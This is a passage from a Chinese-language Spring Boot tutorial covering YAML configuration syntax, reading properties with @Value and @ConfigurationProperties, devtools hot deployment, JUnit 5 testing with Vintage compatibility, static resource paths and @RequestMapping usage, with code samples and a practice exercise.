<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br></pre></td></tr></table></figure>



<p>行内写法：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span> [<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>]</span><br></pre></td></tr></table></figure>



<h5 id="对象数组、对象list、对象set"><a href="#对象数组、对象list、对象set" class="headerlink" title="对象数组、对象list、对象set"></a>对象数组、对象list、对象set</h5><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">students:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">22</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lisi</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">20</span></span><br><span class="line"> <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">wangwu</span>,<span class="attr">age:</span> <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-2-3-占位符赋值"><a href="#5-2-3-占位符赋值" class="headerlink" title="5.2.3 占位符赋值"></a>5.2.3 占位符赋值</h4><p>可以使用 <strong>${key:defaultValue}</strong> 的方式来赋值，若key不存在，则会使用defaultValue来赋值。</p>
<p>例如</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="string">$&#123;myPort:8080&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">myPort:</span> <span class="number">80</span>   </span><br></pre></td></tr></table></figure>

<h3 id="5-3-SpringBoot读取YML"><a href="#5-3-SpringBoot读取YML" class="headerlink" title="5.3.SpringBoot读取YML"></a>5.3.SpringBoot读取YML</h3><h4 id="5-3-1-Value注解"><a href="#5-3-1-Value注解" class="headerlink" title="5.3.1 @Value注解"></a>5.3.1 @Value注解</h4><p>​    注意使用此注解只能获取简单类型的值（8种基本数据类型及其包装类，String,Date）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;student.lastName&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(lastName);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：加了@Value的类必须是交由Spring容器管理的</strong></p>
<h4 id="5-3-2-ConfigurationProperties"><a href="#5-3-2-ConfigurationProperties" class="headerlink" title="5.3.2 @ConfigurationProperties"></a>5.3.2 @ConfigurationProperties</h4><p>​    yml配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">17</span></span><br><span class="line"><span class="attr">student2:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng2</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>​    在类上添加注解@Component  和@ConfigurationProperties(prefix = “配置前缀”)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    从spring容器中获取Student对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Student student;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(student);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <strong>注意事项：要求对应的属性要有set/get方法，并且key要和成员变量名一致才可以对应的上。</strong></p>
<h5 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h5><p>今天SpringBoot配置文件部署时,发出警告<code>Spring Boot Configuration Annotation Processor not configured</code>但是不影响运行</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220201205503274.png" alt="image-20220201205503274"></p>
<p>解决方法</p>
<p>在maven中引入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置注解执行器配置完成后，当执行类中已经定义了对象和该对象的字段后，在配置文件中对该类赋值时，便会非常方便的弹出提示信息。    <strong>注意：添加完依赖加完注解后要运行一次程序才会有相应的提示。</strong></p>
<h3 id="5-4-练习"><a href="#5-4-练习" class="headerlink" title="5.4.练习"></a>5.4.练习</h3><p>要求把下面实体类中的各个属性在yml文件中进行赋值。然后想办法读取yml配置的属性值，进行输出测试。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps2;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Dog&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> String[] arr2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Dog&gt; dogMap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 练习</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">15</span></span><br><span class="line">  <span class="attr">boss:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">birthday:</span> <span class="number">2006</span><span class="string">/2/3</span></span><br><span class="line">  <span class="attr">maps:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">11</span></span><br><span class="line">  <span class="attr">maps2:</span> &#123;<span class="attr">name:</span> <span class="string">caotang</span>,<span class="attr">age:</span> <span class="number">199</span>&#125;</span><br><span class="line">  <span class="attr">list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">小白</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">3</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">小黄</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">4</span></span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">小黑</span>,<span class="attr">age:</span> <span class="number">1</span>&#125;</span><br><span class="line">  <span class="attr">dog:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">小红</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">arr:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">caotang</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">arr2:</span> [<span class="string">sangeng</span>,<span class="string">caotang</span>]</span><br><span class="line">  <span class="attr">dogMap:</span></span><br><span class="line">    <span class="attr">xb:</span> &#123;<span class="attr">name:</span> <span class="string">小白</span>,<span class="attr">age:</span> <span class="number">9</span>&#125;</span><br><span class="line">    <span class="attr">xh:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">小红</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">6</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps2;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Dog&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> String[] arr2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Dog&gt; dogMap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-YML和properties配置的相互转换"><a href="#5-5-YML和properties配置的相互转换" class="headerlink" title="5.5 YML和properties配置的相互转换"></a>5.5 YML和properties配置的相互转换</h3><p>​    我们可以使用一些网站非常方便的实现YML和properties格式配置的相互转换。</p>
<p>转换网站：<a href="https://www.toyaml.com/index.html">https://www.toyaml.com/index.html</a></p>
<h1 id="SpringBoot-常见场景"><a href="#SpringBoot-常见场景" class="headerlink" title="SpringBoot-常见场景"></a>SpringBoot-常见场景</h1><h2 id="1-热部署"><a href="#1-热部署" class="headerlink" title="1.热部署"></a>1.热部署</h2><p>​    SpringBoot为我们提供了一个方便我们开发测试的工具dev-tools。使用后可以实现热部署的效果。当我们运行了程序后对程序进行了修改，程序会自动重启。</p>
<p>​     原理是使用了两个ClassLoder,一个ClassLoader加载哪些不会改变的类(第三方jar包),另一个ClassLoader加载会更改的类.称之为Restart ClassLoader,这样在有代码更改的时候,原来的Restart Classloader被丢弃,重新创建一个Restart ClassLoader,由于需要加载的类相比较少,所以实现了较快的重启。</p>
<p>​    </p>
<h3 id="1-1-准备工作"><a href="#1-1-准备工作" class="headerlink" title="1.1 准备工作"></a>1.1 准备工作</h3><p>①设置IDEA自动编译</p>
<p>​     在idea中的setting做下面配置 </p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E9%85%8D%E7%BD%AE.png" alt="自动编译配置"></p>
<p>②设置允许程序运行时自动启动</p>
<p>​     ctrl + shift + alt + / 这组快捷键后会有一个小弹窗，点击Registry 就会进入下面的界面，找到下面的配置项并勾选，勾选后直接点close </p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/%E5%85%81%E8%AE%B8%E8%BF%90%E8%A1%8C%E6%97%B6%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8.png" alt="允许运行时自动启动"></p>
<h3 id="1-2使用"><a href="#1-2使用" class="headerlink" title="1.2使用"></a>1.2使用</h3><p>①添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>②触发热部署</p>
<p>​    当我们在修改完代码或者静态资源后可以切换到其它软件，让IDEA自动进行编译，自动编译后就会触发热部署。</p>
<p>​    或者使用Ctrl+F9手动触发重新编译。</p>
<h2 id="2-单元测试"><a href="#2-单元测试" class="headerlink" title="2.单元测试"></a>2.单元测试</h2><p>​    我们可以使用SpringBoot整合Junit进行单元测试。</p>
<p>​    <strong>Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库</strong>。</p>
<p>​    Junit5功能相比于Junit4也会更强大。但是本课程是SpringBoot的课程，所以主要针对SpringBoot如何整合Junit进行单元测试做讲解。暂不针对Junit5的新功能做介绍。如有需要会针对Junit5录制专门的课程进行讲解。</p>
<p>​    </p>
<h3 id="2-1-使用"><a href="#2-1-使用" class="headerlink" title="2.1 使用"></a>2.1 使用</h3><h4 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="②编写测试类"><a href="#②编写测试类" class="headerlink" title="②编写测试类"></a>②编写测试类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>注意：测试类所在的包需要和启动类是在同一个包下。否则就要使用如下写法指定启动类。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = HelloApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-2-兼容老版本"><a href="#2-2-兼容老版本" class="headerlink" title="2.2 兼容老版本"></a>2.2 兼容老版本</h3><p>​    如果是对老项目中的SpringBoot进行了版本升级会发现之前的单元测试代码出现了一些问题。</p>
<p>​    因为Junit5和之前的Junit4有比较大的不同。</p>
<p>​    先看一张图：</p>
<p> <img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/junit5.jpeg" alt="img"> </p>
<p>​    从上图可以看出  <strong>JUnit 5 = JUnit Platform + JUnit Jupiter + JUnit Vintage</strong></p>
<ul>
<li><strong>JUnit Platform</strong>： 这是Junit提供的平台功能模块，通过它，其它的测试引擎也可以接入</li>
<li><strong>JUnit JUpiter</strong>：这是JUnit5的核心，是一个基于JUnit Platform的引擎实现，它包含许多丰富的新特性来使得自动化测试更加方便和强大。</li>
<li><strong>JUnit Vintage</strong>：这个模块是兼容JUnit3、JUnit4版本的测试引擎，使得旧版本的自动化测试也可以在JUnit5下正常运行。</li>
</ul>
<p>​    虽然Junit5包含了<strong>JUnit Vintage</strong>来兼容JUnit3和Junit4，但是<strong>SpringBoot 2.4 以上版本对应的spring-boot-starter-test移除了默认对</strong> <strong>Vintage 的依赖。</strong>所以当我们仅仅依赖spring-boot-starter-test时会发现之前我们使用的@Test注解和@RunWith注解都不能使用了。</p>
<p>​    我们可以单独在依赖vintage来进行兼容。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>注意：</strong></p>
<p>​        <strong>org.junit.Test对应的是Junit4的版本，就搭配@RunWith注解来使用。</strong></p>
<p>SpringBoot2.2.0之前版本的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="comment">//import org.junit.jupiter.api.Test;</span></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-Web开发"><a href="#4-Web开发" class="headerlink" title="4.Web开发"></a>4.Web开发</h2><h3 id="4-1-静态资源访问"><a href="#4-1-静态资源访问" class="headerlink" title="4.1 静态资源访问"></a>4.1 静态资源访问</h3><p>​    由于SpringBoot的项目是打成jar包的所以没有之前web项目的那些web资源目录(webapps)。</p>
<p>​    那么我们的静态资源要放到哪里呢？</p>
<p>​    从SpringBoot官方文档中我们可以知道，我们可以把静态资源放到 <code>resources/static</code>   (或者 <code>resources/public</code> 或者<code>resources/resources</code> 或者 <code>resources/META-INF/resources</code>) 中即可。</p>
<p>​    静态资源放完后，</p>
<p>​    例如我们想访问文件：resources/static/index.html  只需要在访问时资源路径写成/index.html即可。  </p>
<p>​    例如我们想访问文件：resources/static/pages/login.html  访问的资源路径写成： /pages/login.html</p>
<h4 id="4-1-1-修改静态资源访问路径"><a href="#4-1-1-修改静态资源访问路径" class="headerlink" title="4.1.1 修改静态资源访问路径"></a>4.1.1 修改静态资源访问路径</h4><p>​    SpringBoot默认的静态资源路径匹配为/** 。如果想要修改可以通过 <code>spring.mvc.static-path-pattern</code> 这个配置进行修改。</p>
<p>​    例如想让访问静态资源的url必须前缀有/res。例如/res/index.html 才能访问到static目录中的。我们可以修改如下：</p>
<p>在application.yml中</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">static-path-pattern:</span> <span class="string">/res/**</span> <span class="comment">#修改静态资源访问路径</span></span><br></pre></td></tr></table></figure>



<h4 id="4-1-2-修改静态资源存放目录"><a href="#4-1-2-修改静态资源存放目录" class="headerlink" title="4.1.2 修改静态资源存放目录"></a>4.1.2 修改静态资源存放目录</h4><p>​    我们可以修改 spring.web.resources.static-locations 这个配置来修改静态资源的存放目录。</p>
<p>​    例如:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">classpath:/sgstatic/</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">classpath:/static/</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-设置请求映射规则-RequestMapping"><a href="#4-2-设置请求映射规则-RequestMapping" class="headerlink" title="4.2 设置请求映射规则@RequestMapping"></a>4.2 设置请求映射规则@RequestMapping</h3><p>​    详细讲解：<a href="https://www.bilibili.com/video/BV1AK4y1o74Y">https://www.bilibili.com/video/BV1AK4y1o74Y</a>  P5-P12</p>
<p>​    该注解可以加到方法上或者是类上。（查看其源码可知）</p>
<p>​    我们可以用其来设定所能匹配请求的要求。只有符合了设置的要求，请求才能被加了该注解的方法或类处理。</p>
<h4 id="4-2-1-指定请求路径"><a href="#4-2-1-指定请求路径" class="headerlink" title="4.2.1 指定请求路径"></a>4.2.1 指定请求路径</h4><p>​    path或者value属性都可以用来指定请求路径。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testPath<strong>的请求能够被</strong>testPath**方法处理则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testPath&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testPath</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test/testPath&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testPath</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-2-指定请求方式"><a href="#4-2-2-指定请求方式" class="headerlink" title="4.2.2 指定请求方式"></a>4.2.2 指定请求方式</h4><p>​    method属性可以用来指定可处理的请求方式。</p>
<p>例如：</p>
<p>​    我们期望让请求的资源路径为**/test/testMethod<strong>的</strong>POST<strong>请求能够被</strong>testMethod**方法处理。则可以写如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/testMethod&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testMethod处理了请求&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testMethod&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>注意：我们可以也可以运用如下注解来进行替换</p>
<ul>
<li><p>​    @PostMapping    等价于   @RequestMapping(method = RequestMethod.POST) </p>
</li>
<li><p>​    @GetMapping    等价于   @RequestMapping(method = RequestMethod.GET) </p>
</li>
<li><p>​    @PutMapping    等价于   @RequestMapping(method = RequestMethod.PUT) </p>
</li>
<li><p>​    @DeleteMapping    等价于   @RequestMapping(method = RequestMethod.DELETE) </p>
</li>
</ul>
<p>例如：</p>
<p>​    上面的需求我们可以使用下面的写法实现</p>
